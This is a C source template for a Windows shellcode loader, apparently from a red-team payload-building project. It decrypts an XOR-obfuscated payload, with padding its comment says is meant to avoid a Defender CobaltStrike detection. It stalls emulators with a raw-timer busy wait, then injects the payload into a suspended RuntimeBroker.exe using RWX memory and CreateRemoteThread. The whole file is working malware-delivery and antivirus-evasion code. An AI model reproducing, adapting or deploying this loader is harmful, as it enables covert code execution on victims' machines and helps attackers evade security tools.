#include <windows.h>
#include <stdio.h>

#define TIMEOUT_MS 10000


// https://github.com/dobin/SuperMega/blob/main/data/source/antiemulation/timeraw.c
int get_time_raw() {
    ULONG* PUserSharedData_TickCountMultiplier = (PULONG)0x7ffe0004;
    LONG* PUserSharedData_High1Time = (PLONG)0x7ffe0324;
    ULONG* PUserSharedData_LowPart = (PULONG)0x7ffe0320;
    DWORD kernelTime = (*PUserSharedData_TickCountMultiplier) * (*PUserSharedData_High1Time << 8) +
        ((*PUserSharedData_LowPart) * (unsigned __int64)(*PUserSharedData_TickCountMultiplier) >> 24);
    return kernelTime;
}

int sleep_ms(DWORD sleeptime) {
    DWORD start = get_time_raw();
    while (get_time_raw() - start < sleeptime) {}
}

void antiemulation() {
    sleep_ms(3000);
}


// Simple XOR will be detected as : 
//   https://defendersearch.r00ted.ch/threat?name=Trojan%3AWin64%2FCobaltStrike.JU%21MTB
void xor_cipher(char *ciphertext, size_t ciphertext_len, const char *key, size_t key_len) {
    int instruction_stuffing = 0;
    if (key_len == 0) return;  // prevent division by zero

    for (size_t i = 0; i < ciphertext_len; ++i) {
        instruction_stuffing += key_len * i;
        ciphertext[i] ^= key[i % key_len];
    }

    if (instruction_stuffing == 0) {
        printf("Nothing");
    }
}


int main(void)
{
	DWORD result;
	{{SHELLCODE}}

    antiemulation();

    // Start a suspended target process (RuntimeBroker — rarely inspected, always present on Win10+)
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // Use RuntimeBroker.exe as target — legitimate Windows process, rarely interacted with
    char targetProc[] = "C:\\Windows\\System32\\RuntimeBroker.exe";
    if (!CreateProcessA(targetProc, NULL, NULL, NULL, FALSE,
            CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        return 1;
    }

    // Decrypt shellcode locally first
    char *decrypted = (char *)malloc(sizeof(shellcode));
    if (decrypted == NULL) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 2;
    }
    memcpy(decrypted, shellcode, sizeof(shellcode));
    xor_cipher(decrypted, sizeof(shellcode), xorkey, strlen(xorkey));

    // Allocate RWX memory in the remote process
    LPVOID remoteMem = VirtualAllocEx(pi.hProcess, NULL, sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (remoteMem == NULL) {
        free(decrypted);
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 3;
    }

    // Write the decrypted shellcode into the remote process
    SIZE_T written = 0;
    if (!WriteProcessMemory(pi.hProcess, remoteMem, decrypted, sizeof(shellcode), &written)) {
        free(decrypted);
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 4;
    }
    free(decrypted);

    // Create a remote thread in the target process to execute the shellcode
    HANDLE hRemoteThread = CreateRemoteThread(pi.hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)remoteMem, NULL, 0, NULL);
    if (hRemoteThread == NULL) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 5;
    }

    // Wait for the remote thread to finish, or timeout after TIMEOUT_MS
    DWORD waitResult = WaitForSingleObject(hRemoteThread, TIMEOUT_MS);

    // Cleanup: terminate the child process regardless
    CloseHandle(hRemoteThread);
    TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return 0;
}
